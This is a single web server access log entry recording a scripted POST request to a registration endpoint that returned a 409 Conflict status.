5.181.235.71 - - [02/Jun/2025:02:00:24 +0000] "POST /api/auth/register HTTP/1.1" 409 193 "-" "python-requests/2.28.0"
